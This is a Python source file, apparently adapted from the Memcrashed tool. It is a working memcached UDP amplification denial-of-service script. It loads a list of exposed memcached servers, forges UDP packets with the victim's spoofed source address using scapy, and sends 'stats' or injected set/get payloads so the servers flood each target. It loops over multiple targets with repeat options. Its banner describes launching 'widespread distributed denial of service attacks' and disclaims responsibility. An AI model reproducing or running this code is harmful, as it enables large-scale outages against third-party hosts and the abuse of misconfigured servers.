#!/usr/bin/env python3

#
# Based on Memcrashed.py
#
# Changes made:
# * pass configuration as options/flags rather than through interactive session
# * support multiple targets (IP:PORT pairs)
# * shodan API is not used, the list of servers should be available in bots.txt
#   (see README file with step-by-step guide how to download list of 17k+ servers)
#
# Known limitations:
# * memcached port is asuumed to be 11211 for all given bot IPs
#   (which is consistent with how Shadon search API is used anyways)
#

import click
from scapy.all import *
from tqdm import tqdm
from typing import List, Optional


logo = """
                                        ████                                
                                    ████▒▒██                                
                                  ████  ▒▒██                                
                                ██▒▒  ▒▒▒▒▒▒██                              
                              ██▒▒██        ██                              
  ████                      ██▒▒██          ██                              
██▒▒▒▒██████                ██▒▒██      ▒▒  ████                            
██▒▒▒▒██    ████      ██████▒▒▒▒▒▒██    ▒▒▒▒██████████████                  
██▒▒    ████▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒████              
██▒▒▒▒      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            
  ██▒▒      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████        
  ██        ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██      
  ██▒▒    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    
  ██▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    
    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    ██▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██  
    ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██      ██▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒██  
    ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        ██▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██  
      ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        ██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██  
      ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
        ████  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
          ██    ▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒    ██▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
          ██            ████▒▒▒▒▒▒▒▒▒▒    ██  ▒▒  ▒▒        ▒▒▒▒▒▒▒▒▒▒▒▒██  
            ██                      ██  ████  ▒▒          ▒▒▒▒▒▒▒▒▒▒▒▒▒▒██  
              ██                      ██▒▒██              ▒▒  ▒▒▒▒▒▒▒▒▒▒██  
                ██████████████████████▒▒▒▒██                    ▒▒▒▒▒▒██    
                      ██▒▒      ██▒▒▒▒▒▒▒▒██                    ▒▒▒▒██      
                      ██▒▒▒▒  ██▒▒▒▒▒▒▒▒████                  ▒▒▒▒██        
                      ██▒▒▒▒▒▒██▒▒▒▒▒▒██  ██                    ██          
                        ██████▒▒▒▒▒▒██    ██                ████            
                              ██████      ██          ██████                
                                            ██    ████                      
                                            ██████                          


                                   Based on: Memcrashed
                                    Version: 1.0

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
"""

MEMCACHED_PORT = 11211
STATS_PAYLOAD = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def display_logo():
    print(f"\033[0m{logo}")


def read_bots(filepath:str="./bots.txt") -> List[str]:
    with open(filepath, "r") as fd:
        return [ip.strip() for ip in  fd.readlines() if ip.strip() != ""]


def prepare_packets(
    dest_ip: str,
    dest_port: int,
    target_ip: str,
    target_port: int,
    payload: Optional[str] = STATS_PAYLOAD,
    num_packets: int = 1,
):
    payload = STATS_PAYLOAD if payload is None else payload
    if payload != STATS_PAYLOAD:
        size = str(len(payload)+1)
        setdata = f"\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00{size}\r\n{payload}\r\n"
        yield (IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=setdata), 1)
        payload = "\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n"
    yield (IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=payload), num_packets)


class IpPortPair(click.ParamType):
    name = "IP:PORT"

    def convert(self, value, param, ctx):
        parts = value.split(":")
        if len(parts) == 1:
            ip, port = parts[0], 80
        elif len(parts) == 2:
            ip, port = parts[0], int(parts[1])
        else:
            self.fail(f"{value!r} should be valid <IP:PORT> pair", param, ctx)
        return (ip, port)


@click.command()
@click.option("--targets", "-t", type=IpPortPair(), help="<ip:port> pair", multiple=True)
@click.option("--num-packets", default=1, help="Number of packets to send to each Memcached server (per loop)")
@click.option("--bots-config", default="./bots.txt", help="Path to file with the list of Memcached servers")
@click.option("--repeat", default=1, help="How many times to loop over list of bot servers")
@click.option("--logo/--no-logo", default=True)
@click.option("--payload", default=None, help="Packet payload (defaults to 'stats' request)")
def crash(targets, num_packets, bots_config, repeat, logo, payload):
    if not targets:
        print(f"ERROR: at least a single target should be specified")
        exit(1)

    bots = read_bots(bots_config)
    n_bots = len(bots)
    if not bots:
        print(f"ERROR: {bot_config} file is missing or empty")
        exit(1)

    if logo:
        display_logo()

    print(f"Loaded {n_bots} Memcached IPs")

    for loop in range(1,repeat+1):
        for ip, port in targets:
            with tqdm(total=n_bots*num_packets) as progress:
                for bot in bots:
                    progress.set_description(f"==> [{loop}] targeting {ip: >16}:{port} -- {bot: <16}")
                    for packet, to_send in prepare_packets(
                        dest_ip=bot,
                        dest_port=MEMCACHED_PORT,
                        target_ip=ip,
                        target_port=port,
                        payload=payload,
                        num_packets=num_packets
                    ):
                        send(packet, count=to_send, verbose=False)
                    progress.update(num_packets)


if __name__ == "__main__":
    crash()
